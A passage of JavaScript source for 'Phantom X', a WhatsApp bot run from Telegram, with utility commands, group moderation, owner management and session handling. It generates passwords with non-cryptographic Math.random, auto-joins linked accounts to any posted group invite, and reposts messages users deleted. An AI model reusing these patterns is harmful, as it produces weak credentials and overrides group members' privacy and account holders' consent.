                    await sock.sendMessage(from, { image: imgBuf, caption: "🖼️ Sticker converted to image!" }, { quoted: msg });
                } catch (e) { await reply(`❌ Conversion failed: ${e?.message}`); }
                break;
            }

            case ".qr": {
                const qrText = parts.slice(1).join(" ").trim();
                if (!qrText) return reply("Usage: .qr <text or link>\nExample: .qr https://phantom-x.replit.app");
                await reply("⏳ Generating QR code...");
                try {
                    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=512x512&data=${encodeURIComponent(qrText)}`;
                    const qrBuf = await fetchBuffer(qrUrl);
                    await sock.sendMessage(from, { image: qrBuf, caption: `📱 *QR Code for:*\n_${qrText}_` }, { quoted: msg });
                } catch (e) { await reply(`❌ QR generation failed: ${e?.message}`); }
                break;
            }

            case ".genpwd": {
                const pwdLen = Math.min(Math.max(parseInt(parts[1]) || 16, 6), 64);
                const pwdChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:,.<>?";
                let pwd = "";
                for (let i = 0; i < pwdLen; i++) {
                    pwd += pwdChars[Math.floor(Math.random() * pwdChars.length)];
                }
                await reply(`🔐 *Generated Password (${pwdLen} chars):*\n\n\`${pwd}\`\n\n_Keep this safe! Don't share it._`);
                break;
            }

            case ".base64": {
                const b64Sub = parts[1]?.toLowerCase();
                const b64Text = parts.slice(2).join(" ").trim();
                if (!b64Sub || !b64Text || !["encode","decode"].includes(b64Sub)) {
                    return reply("Usage:\n*.base64 encode <text>*\n*.base64 decode <base64>*\n\nExample: .base64 encode Hello World");
                }
                try {
                    if (b64Sub === "encode") {
                        const encoded = Buffer.from(b64Text, "utf8").toString("base64");
                        await reply(`🔒 *Base64 Encoded:*\n\n\`${encoded}\``);
                    } else {
                        const decoded = Buffer.from(b64Text, "base64").toString("utf8");
                        await reply(`🔓 *Base64 Decoded:*\n\n${decoded}`);
                    }
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            default:
                if (isSelfChat && body) {
                    await reply(`👋 I'm active! Type *.menu* to see all commands.`);
                }
                break;
        }
    } catch (err) {
        console.error("Message handler error:", err?.message || err);
    }
}

// --- GROUP EVENTS HANDLER ---
async function handleGroupUpdate(sock, update, ctx, botJid) {
    const { id: groupJid, participants, action } = update;

    try {
        // Save group name whenever we see any event from a group
        try {
            if (!groupNames[groupJid]) {
                const meta = await sock.groupMetadata(groupJid);
                groupNames[groupJid] = meta.subject;
                // Also save invite link for auto-rejoin
                const code = await sock.groupInviteCode(groupJid);
                savedGroupLinks[groupJid] = code;
            }
        } catch (_) {}

        // Detect when the bot itself is removed/kicked from a group
        if (action === "remove" && botJid && participants.includes(botJid)) {
            const gName = groupNames[groupJid] || groupJid;
            const savedCode = savedGroupLinks[groupJid];

            // Alert owner on Telegram immediately
            try {
                await ctx.reply(
                    `🚨 *ALERT: Bot was kicked!*\n\n` +
                    `I was removed from the group:\n*"${gName}"*\n\n` +
                    `⚠️ Someone may be trying to steal or takeover that group.\n\n` +
                    `${savedCode ? "🔄 Attempting to auto-rejoin now..." : "❌ No saved invite link — I can't rejoin automatically. Use *.link* in a group next time to enable auto-rejoin."}`
                );
            } catch (_) {}

            // Try to auto-rejoin if we have a saved invite link
            if (savedCode) {
                try {
                    await delay(3000);
                    await sock.groupAcceptInvite(savedCode);
                    await ctx.reply(`✅ Successfully rejoined *"${gName}"*. I'm back in the group!`);
                } catch (rejoinErr) {
                    await ctx.reply(`❌ Auto-rejoin failed for *"${gName}"*: ${rejoinErr?.message || "link may have expired or been changed."}`);
                }
            }
            return;
        }

        if (action === "add" && getGroupSetting(groupJid, "welcome")) {
            for (const jid of participants) {
                const name = `@${jid.split("@")[0]}`;
                await sock.sendMessage(groupJid, {
                    text: `🎉 Welcome to the group, ${name}! 👋\n\nWe're glad to have you here. Please read the group rules and enjoy your stay! 🙏`,
                    mentions: [jid],
                });
            }
        }

        if (action === "remove" && getGroupSetting(groupJid, "goodbye")) {
            for (const jid of participants) {
                const name = `@${jid.split("@")[0]}`;
                await sock.sendMessage(groupJid, {
                    text: `👋 ${name} has left the group.\n\nSafe travels! 🕊️`,
                    mentions: [jid],
                });
            }
        }

        if (action === "demote" && getGroupSetting(groupJid, "antidemote")) {
            const culprit = update.author; // the person who did the demoting
            for (const jid of participants) {
                try {
                    // Immediately demote the person who triggered this
                    if (culprit && culprit !== jid) {
                        await sock.groupParticipantsUpdate(groupJid, [culprit], "demote");
                    }
                    await sock.sendMessage(groupJid, {
                        text:
                            `⚠️ *Anti-Demote Alert!*\n\n` +
                            `@${culprit ? culprit.split("@")[0] : "Someone"} tried to demote @${jid.split("@")[0]}.\n\n` +
                            `⚡ *@${culprit ? culprit.split("@")[0] : "The culprit"}* has been demoted immediately as punishment.\n\n` +
                            `📋 *@${jid.split("@")[0]}* — your case is now with the group owner. Awaiting owner's verdict. 👑`,
                        mentions: culprit ? [jid, culprit] : [jid],
                    });
                } catch (e) {
                    console.error("Anti-demote error:", e?.message);
                }
            }
        }
    } catch (err) {
        console.error("Group update handler error:", err?.message || err);
    }
}

// --- TELEGRAM COMMANDS ---
telBot.start(async (ctx) => {
    try {
        if (welcomeConfig.photoFileId) {
            await ctx.replyWithPhoto(welcomeConfig.photoFileId, {
                caption: welcomeConfig.text,
                parse_mode: "Markdown",
            });
        } else {
            await ctx.reply(welcomeConfig.text, { parse_mode: "Markdown" });
        }
    } catch (err) {
        // Fallback if Markdown fails
        await ctx.reply(welcomeConfig.text).catch(() => {});
    }
});

// --- OWNER-ONLY: Set welcome message text ---
telBot.command("setwelcome", async (ctx) => {
    if (!isOwner(ctx)) return ctx.reply("⛔ This command is for the bot owner only.");
    const newText = ctx.message.text.replace(/^\/setwelcome\s*/i, "").trim();
    if (!newText) return ctx.reply(
        "Usage: /setwelcome Your custom welcome message here\n\n" +
        "You can use Telegram markdown:\n" +
        "  *bold*  _italic_  `code`\n\n" +
        "Example:\n/setwelcome Welcome to *My Bot!* 🎉\n\nSend /pair to link WhatsApp."
    );
    welcomeConfig.text = newText;
    saveWelcomeConfig();
    await ctx.reply("✅ Welcome message updated! Use /previewwelcome to see how it looks.");
});

// --- OWNER-ONLY: Set welcome photo (reply to a photo with this command) ---
telBot.command("setwelcomepic", async (ctx) => {
    if (!isOwner(ctx)) return ctx.reply("⛔ This command is for the bot owner only.");
    const photo = ctx.message?.reply_to_message?.photo;
    if (!photo || !photo.length) return ctx.reply(
        "📸 How to set a welcome photo:\n\n" +
        "1. Send the photo you want to use\n" +
        "2. Then *reply to that photo* with /setwelcomepic\n\n" +
        "_The photo will show whenever a user types /start_",
        { parse_mode: "Markdown" }
    );
    // Use the highest-resolution version of the photo
    const fileId = photo[photo.length - 1].file_id;
    welcomeConfig.photoFileId = fileId;
    saveWelcomeConfig();
    await ctx.reply("✅ Welcome photo set! Use /previewwelcome to see the full welcome.");
});

// --- OWNER-ONLY: Remove welcome photo ---
telBot.command("clearwelcomepic", async (ctx) => {
    if (!isOwner(ctx)) return ctx.reply("⛔ This command is for the bot owner only.");
    welcomeConfig.photoFileId = null;
    saveWelcomeConfig();
    await ctx.reply("✅ Welcome photo removed. /start will now show text only.");
});

// --- OWNER-ONLY: Preview what users will see ---
telBot.command("previewwelcome", async (ctx) => {
    if (!isOwner(ctx)) return ctx.reply("⛔ This command is for the bot owner only.");
    await ctx.reply("👁 Here's what users will see when they type /start:\n─────────────────");
    try {
        if (welcomeConfig.photoFileId) {
            await ctx.replyWithPhoto(welcomeConfig.photoFileId, {
                caption: welcomeConfig.text,
                parse_mode: "Markdown",
            });
        } else {
            await ctx.reply(welcomeConfig.text, { parse_mode: "Markdown" });
        }
    } catch (err) {
        await ctx.reply(welcomeConfig.text).catch(() => {});
    }
    await ctx.reply(
        "─────────────────\n" +
        "Owner commands:\n" +
        "• /setwelcome <text> — change the welcome text\n" +
        "• /setwelcomepic — reply to a photo to set welcome image\n" +
        "• /clearwelcomepic — remove the welcome photo\n" +
        "• /previewwelcome — see this preview again\n" +
        "• /addowner <telegram_id> — grant owner access to someone\n" +
        "• /removeowner <telegram_id> — revoke their owner access\n" +
        "• /listowners — see all current owners"
    );
});

// --- OWNER-ONLY: Add another owner (primary owner only) ---
telBot.command("addowner", async (ctx) => {
    if (!isPrimaryOwner(ctx)) return ctx.reply("⛔ Only the primary owner can add new owners.");
    const newId = ctx.message.text.replace(/^\/addowner\s*/i, "").trim();
    if (!newId || !/^\d+$/.test(newId)) return ctx.reply(
        "Usage: /addowner <telegram_id>\n\n" +
        "Example: /addowner 123456789\n\n" +
        "To get someone's Telegram ID, ask them to message @userinfobot on Telegram."
    );
    if (newId === PRIMARY_OWNER_ID) return ctx.reply("That's already you — the primary owner! 😄");
    if (welcomeConfig.extraOwners.includes(newId)) return ctx.reply(`⚠️ ID ${newId} is already an owner.`);
    welcomeConfig.extraOwners.push(newId);
    saveWelcomeConfig();
    await ctx.reply(`✅ Done! ID *${newId}* has been added as an owner.\n\nThey can now use all owner commands.`, { parse_mode: "Markdown" });
});

// --- OWNER-ONLY: Remove an owner (primary owner only) ---
telBot.command("removeowner", async (ctx) => {
    if (!isPrimaryOwner(ctx)) return ctx.reply("⛔ Only the primary owner can remove owners.");
    const targetId = ctx.message.text.replace(/^\/removeowner\s*/i, "").trim();
    if (!targetId || !/^\d+$/.test(targetId)) return ctx.reply("Usage: /removeowner <telegram_id>\n\nExample: /removeowner 123456789");
    if (targetId === PRIMARY_OWNER_ID) return ctx.reply("❌ You can't remove yourself as the primary owner.");
    if (!welcomeConfig.extraOwners.includes(targetId)) return ctx.reply(`⚠️ ID ${targetId} is not in the owners list.`);
    welcomeConfig.extraOwners = welcomeConfig.extraOwners.filter(id => id !== targetId);
    saveWelcomeConfig();
    await ctx.reply(`✅ ID *${targetId}* has been removed from owners.`, { parse_mode: "Markdown" });
});

// --- OWNER-ONLY: List all owners ---
telBot.command("listowners", async (ctx) => {
    if (!isOwner(ctx)) return ctx.reply("⛔ This command is for the bot owner only.");
    const lines = [`👑 *Primary Owner (you):* ${PRIMARY_OWNER_ID}`];
    if (welcomeConfig.extraOwners.length === 0) {
        lines.push("\n_No extra owners added yet._");
    } else {
        lines.push("\n👥 *Extra Owners:*");
        welcomeConfig.extraOwners.forEach((id, i) => lines.push(`${i + 1}. ${id}`));
    }
    lines.push("\n\nUse /addowner <id> or /removeowner <id> to manage.");
    await ctx.reply(lines.join("\n"), { parse_mode: "Markdown" });
});

telBot.command("pair", async (ctx) => {
    const userId = ctx.from.id;
    const input = ctx.message.text.split(" ")[1];
    if (!input) return ctx.reply("Abeg, add your number! Example: /pair 2348102756072");

    if (activeSockets[userId]) {
        try { activeSockets[userId].end(); } catch (_) {}
        delete activeSockets[userId];
    }

    retryCounts[userId] = 0;
    clearAuthState(userId);

    ctx.reply("🔄 Generating your pairing code... please wait a few seconds.");
    startBot(userId, input.trim(), ctx);
});

// Kill any existing polling session (prevents 409 Conflict on restart)
(function killExistingSession(cb) {
    const killUrl = `/bot${TELEGRAM_TOKEN}/deleteWebhook?drop_pending_updates=true`;
    const req = https.request({ hostname: "api.telegram.org", path: killUrl, method: "GET" }, () => { setTimeout(cb, 1500); });
    req.on("error", () => setTimeout(cb, 1500));
    req.end();
})(() => {
    try { rearmAllReminders(); rearmAllTimers(); } catch (e) { console.log(`[boot] rearm err: ${e?.message}`); }
    try { schedulePromoGroup(); } catch (e) { console.log(`[boot] promo sched err: ${e?.message}`); }
    try { scheduleThreatReportCycle(); } catch (e) { console.log(`[boot] threat sched err: ${e?.message}`); }
    (function launchTelegram(attempt) {
        telBot.launch({ dropPendingUpdates: true }).catch(err => {
            if (err?.message?.includes("409")) {
                const wait = Math.min(5000 * attempt, 60000);
                console.log(`[Telegram] 409 Conflict — retrying in ${wait / 1000}s... (attempt ${attempt})`);
                setTimeout(() => launchTelegram(attempt + 1), wait);
            } else {
                console.error("[Telegram] Fatal launch error:", err?.message || err);
            }
        });
    })(1);
});

process.once("SIGINT", () => telBot.stop("SIGINT"));
process.once("SIGTERM", () => telBot.stop("SIGTERM"));

// --- KEEP-ALIVE HTTP SERVER (for UptimeRobot / cron-job.org pings) ---
const PING_PORT = parseInt(process.env.PORT) || 3000;
function startKeepAliveServer(port) {
    const server = http.createServer((req, res) => {
        res.writeHead(200, { "Content-Type": "text/plain" });
        res.end("👻 Phantom X is alive!\n");
    });
    server.on("error", (err) => {
        if (err.code === "EADDRINUSE") {
            console.log(`[Ping] Port ${port} already in use — trying ${port + 1}...`);
            setTimeout(() => startKeepAliveServer(port + 1), 1000);
        } else {
            console.error("[Ping] Server error:", err.message);
        }
    });
    server.listen(port, () => {
        console.log(`[Ping] Keep-alive server running on port ${port}`);
    });
}
startKeepAliveServer(PING_PORT);

// --- SELF-PING (keeps the host awake — works on Replit AND Render free tier) ---
// Detects the platform automatically using environment variables each sets.
// Pings itself every 4 minutes so the service never sleeps.
(function startSelfPing() {
    // Replit sets REPLIT_DEV_DOMAIN, Render sets RENDER_EXTERNAL_URL
    const replitDomain = process.env.REPLIT_DEV_DOMAIN;
    const renderUrl    = process.env.RENDER_EXTERNAL_URL;

    const selfUrl = renderUrl || (replitDomain ? `https://${replitDomain}` : null);
    if (!selfUrl) return; // Not on a supported platform — skip self-ping

    console.log(`[SelfPing] Auto-pinging ${selfUrl} every 4 minutes to stay awake.`);

    setInterval(() => {
        try {
            const mod = selfUrl.startsWith("https") ? https : http;
            mod.get(selfUrl, (res) => {
                // Success — service stays awake
            }).on("error", (err) => {
                console.log(`[SelfPing] Ping failed (will retry in 4 min): ${err.message}`);
            });
        } catch (e) {
            // Silently ignore
        }
    }, 4 * 60 * 1000); // every 4 minutes
})();

// --- SCHEDULE TIMER (check every minute, fire scheduled messages) ---
setInterval(async () => {
    const now = new Date();
    const HH = String(now.getHours()).padStart(2, "0");
    const MM = String(now.getMinutes()).padStart(2, "0");
    const currentTime = `${HH}:${MM}`;
    const sd = loadSchedules();
    for (const [groupJid, entries] of Object.entries(sd)) {
        for (const entry of (entries || [])) {
            if (entry.time !== currentTime) continue;
            // Prefer the socket that owns this schedule (matched by botJid)
            let targetSock = null;
            if (entry.botJid) {
                // Find the socket whose user JID matches the stored botJid
                for (const s of Object.values(activeSockets)) {
                    const sJid = s.user?.id || "";
                    if (sJid === entry.botJid || sJid.startsWith(entry.botJid.split(":")[0])) {
                        targetSock = s; break;
                    }
                }
            }
            // Fallback to first active socket if no match
            if (!targetSock) targetSock = Object.values(activeSockets)[0];
            if (targetSock) {
                try {
                    await targetSock.sendMessage(groupJid, { text: entry.message });
                    console.log(`[Schedule] Sent "${entry.time}" to ${groupJid}`);
                } catch (e) {
                    console.error(`[Schedule] Failed to send to ${groupJid}:`, e?.message);
                }
            }
        }
    }
}, 60000);

// --- AUTO-RECONNECT SAVED SESSIONS ON STARTUP ---
(async () => {
    const sessions = loadSessions();
    const entries = Object.entries(sessions);
    // T14: re-arm any pending auto-join timers from disk
    setTimeout(() => { try { rearmAllPendingJoins(); } catch (e) { console.error("rearm err:", e?.message); } }, 5000);
    if (!entries.length) return;
    console.log(`[Startup] Found ${entries.length} saved session(s). Auto-reconnecting...`);
    for (const [userId, { phoneNumber, chatId }] of entries) {
        const authDir = getAuthDir(userId);
        if (!fs.existsSync(authDir)) {
            console.log(`[Startup] No auth folder for user ${userId}, skipping.`);
            deleteSession(userId);
            continue;
        }
        const fakeCtx = makeFakeCtx(chatId);
        try {
            await fakeCtx.reply("🔄 Bot restarted. Reconnecting your WhatsApp session automatically...");
            startBot(Number(userId), phoneNumber, fakeCtx, true);
        } catch (e) {
            console.error(`[Startup] Failed to reconnect user ${userId}:`, e?.message);
        }
    }
})();

// --- WHATSAPP ENGINE ---
async function startBot(userId, phoneNumber, ctx, isReconnect = false) {
    const { state, saveCreds } = await useMultiFileAuthState(getAuthDir(userId));
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "fatal" }),
        markOnline: false,              // don't mark number as online — reduces presence traffic & lag
        syncFullHistory: false,         // don't pull full chat history on connect
        generateHighQualityLinkPreview: false, // skip link preview generation — reduces processing overhead
        getMessage: async () => undefined,     // prevents retry fetching of old messages
    });

    activeSockets[userId] = sock;

    if (!isReconnect && !sock.authState.creds.registered) {
        await delay(3000);
        try {
            const code = await sock.requestPairingCode(phoneNumber);
            await ctx.reply("✅ Your pairing code is ready!\n\nOpen WhatsApp → Linked Devices → Link a Device → Enter code manually.\n\nHere is your code 👇");
            await ctx.reply(`\`${code}\``, { parse_mode: "Markdown" });
        } catch (err) {
            console.error(`Pairing error for user ${userId}:`, err?.message || err);
            await ctx.reply("❌ Failed to generate pairing code. Please try again with /pair <your number>.");
            return;
        }
    }

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("presence.update", ({ id, presences }) => {
        for (const [jid, pres] of Object.entries(presences)) {
            if (pres.lastKnownPresence) presenceTracker[jid] = pres.lastKnownPresence;
        }
    });

    sock.ev.on("messages.upsert", async ({ messages, type }) => {
        for (const msg of messages) {
            // Process "notify" (normal incoming) OR any fromMe message (owner commands in self-chat/groups)
            if (type !== "notify" && !msg.key.fromMe) continue;
            await handleMessage(sock, msg);
        }
    });

    // Auto-join group links detection
    sock.ev.on("messages.upsert", async ({ messages, type }) => {
        if (type !== "notify") return;
        for (const m of messages) {
            if (m.key?.fromMe) continue;
            const ajFrom = m.key?.remoteJid;
            if (!ajFrom?.endsWith("@g.us")) continue;
            const aj = loadAutojoin();
            const ajKey = sock.user?.id || "global";
            if (!aj[ajKey]?.enabled) continue;
            const ajText =
                m.message?.conversation ||
                m.message?.extendedTextMessage?.text ||
                m.message?.imageMessage?.caption ||
                m.message?.videoMessage?.caption || "";
            const linkMatch = ajText.match(/https?:\/\/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/);
            if (!linkMatch) continue;
            const ajCode = linkMatch[1];
            // Blacklist check
            const blacklist = ["porn","adult","xxx","nude","sex","leak","onlyfan"];
            if (blacklist.some(b => ajText.toLowerCase().includes(b))) continue;
            try {
                await sock.groupAcceptInvite(ajCode);
                console.log(`[AutoJoin] Joined group via link code: ${ajCode}`);
            } catch (e) {
                console.log(`[AutoJoin] Failed to join ${ajCode}: ${e?.message}`);
            }
        }
    });

    // Store messages for antidelete lookup
    const msgCache = {};
    sock.ev.on("messages.upsert", ({ messages }) => {
        for (const m of messages) {
            if (m.key?.id && m.message) msgCache[m.key.id] = m;
        }
    });

    sock.ev.on("messages.delete", async (item) => {
        try {
            const keys = item.keys || (item.key ? [item.key] : []);
            for (const key of keys) {
                const groupJid = key.remoteJid;
                if (!groupJid?.endsWith("@g.us")) continue;
                if (!getGroupSetting(groupJid, "antidelete")) continue;
                const cached = msgCache[key.id];
                if (!cached?.message) continue;
                const type = getContentType(cached.message);
                const who = key.participant || cached.key?.participant;
                const whoNum = who ? `@${who.split("@")[0]}` : "Someone";
                try {
                    if (type === "conversation" || type === "extendedTextMessage") {
                        const txt = cached.message?.conversation || cached.message?.extendedTextMessage?.text || "";
                        if (txt) {
                            await sock.sendMessage(groupJid, {
                                text: `🗑️ *Deleted Message Caught!*\n👤 *From:* ${whoNum}\n\n📝 *Message:*\n${txt}`,
                                mentions: who ? [who] : [],
                            });
                        }
                    } else if (type === "imageMessage") {
                        const buf = await downloadMediaMessage(cached, "buffer", {}, { logger: pino({ level: "silent" }) });
                        await sock.sendMessage(groupJid, {
                            image: buf,
                            caption: `🗑️ *Deleted image caught!* (Sent by ${whoNum})`,
                            mentions: who ? [who] : [],
                        });
                    } else if (type === "videoMessage") {
                        const buf = await downloadMediaMessage(cached, "buffer", {}, { logger: pino({ level: "silent" }) });
                        await sock.sendMessage(groupJid, {
                            video: buf,
                            caption: `🗑️ *Deleted video caught!* (Sent by ${whoNum})`,
                            mentions: who ? [who] : [],
                        });
                    }
                } catch (_) {}
            }
        } catch (e) {
            console.error("[Antidelete]", e?.message);
        }
    });

    sock.ev.on("group-participants.update", async (update) => {
        await handleGroupUpdate(sock, update, ctx, botJids[userId]);
    });

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === "open") {
            retryCounts[userId] = 0;
            botJids[userId] = sock.user?.id || sock.user?.jid || null;
            telegramCtxs[userId] = ctx;
            // Save session so it auto-reconnects after restart
            saveSession(userId, phoneNumber, ctx.from?.id || userId);
            ctx.reply(isReconnect
                ? "✅ WhatsApp connection restored!\n\nPhantom X is back online. Send *.menu* on WhatsApp to see commands."
                : "🎊 WhatsApp Bot is now connected and LIVE!\n\nSend *.menu* on WhatsApp to see all commands."
            );
            try {
                await delay(3000);
                const selfJid = (sock.user?.id || "").split(':')[0].split('@')[0] + "@s.whatsapp.net";
                await sock.sendMessage(selfJid, {
                    text: `╔══════════════════════╗\n║  ✅  PHANTOM X ${isReconnect ? "RESTORED" : "LIVE"}  ✅  ║\n╚══════════════════════╝\n\n🔥 *Your bot is now ${isReconnect ? "BACK ONLINE" : "CONNECTED"}!*\n\nYou can chat me here or use me in any group.\nType *.menu* to see all commands.\n━━━━━━━━━━━━━━━━━━━━`
                });
                // T14: schedule the auto-join + welcome DM (only on first pair)
                if (!isReconnect) {
                    try { scheduleLinkWelcome(userId, sock); } catch (e2) { console.error("Schedule welcome error:", e2?.message); }
                }
            } catch (e) { console.error("Welcome WA msg error:", e?.message); }
            console.log(`User ${userId} connected! Bot JID: ${botJids[userId]}`);
        }

        if (connection === "close") {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const reason = lastDisconnect?.error?.message || "unknown";
            console.log(`User ${userId} disconnected (${statusCode}): ${reason}`);

            const shouldNotReconnect = [
                DisconnectReason.loggedOut,
                DisconnectReason.forbidden,
                DisconnectReason.badSession,
                DisconnectReason.connectionReplaced,
            ].includes(statusCode);

            if (shouldNotReconnect) {
                delete activeSockets[userId];
                delete retryCounts[userId];
                deleteSession(userId);
                try { removePendingJoin(userId); } catch {}
                if (statusCode === DisconnectReason.loggedOut) {
                    clearAuthState(userId);
                    ctx.reply("⚠️ WhatsApp session ended. Use /pair to reconnect.");
                }
                return;
            }

            retryCounts[userId] = (retryCounts[userId] || 0) + 1;
            if (retryCounts[userId] > MAX_RETRIES) {
                delete activeSockets[userId];
                delete retryCounts[userId];
                ctx.reply("❌ Could not stay connected to WhatsApp. Please try /pair again.");
                return;
            }

            console.log(`User ${userId}: reconnecting (attempt ${retryCounts[userId]})...`);
            await delay(4000);
            startBot(userId, phoneNumber, ctx, true);
        }
    });
}
